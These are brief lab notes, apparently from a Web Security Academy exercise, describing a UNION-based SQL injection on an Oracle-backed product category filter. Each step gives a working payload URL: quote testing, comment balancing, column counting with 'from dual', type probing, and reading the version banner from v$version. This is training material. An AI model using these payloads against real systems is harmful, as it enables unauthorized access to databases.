## SQL injection attack, querying the database type and version on Oracle
## Oracal Database

1. main url: product category==>
https://0a64004f03c6fcca80b3264f00c000d8.web-security-academy.net/filter?category=Accessories

2. put a single qoute at the end of the category parameter to see   if the application is vulnerable to SQL injection, for example:

https://0a64004f03c6fcca80b3264f00c000d8.web-security-academy.net/filter?category=Accessories'

3. For balance use double dash (--) to comment out the rest of the query, for example:

https://0a64004f03c6fcca80b3264f00c000d8.web-security-academy.net/filter?category=Accessories' --

4. find the number of columns in the original query by using the UNION operator with a different number of columns in each SELECT statement, for example:

https://0a64004f03c6fcca80b3264f00c000d8.web-security-academy.net/filter?category=Accessories' union select null,null from dual--

5. find the data type of each column by using the UNION operator with different data types in each SELECT statement, for example:

https://0a64004f03c6fcca80b3264f00c000d8.web-security-academy.net/filter?category=Accessories' union select 'asbf','dsda' from dual--


6. find the database type and version by using the following query:

https://0a64004f03c6fcca80b3264f00c000d8.web-security-academy.net/filter?category=Accessories' union select banner,null from v$version--




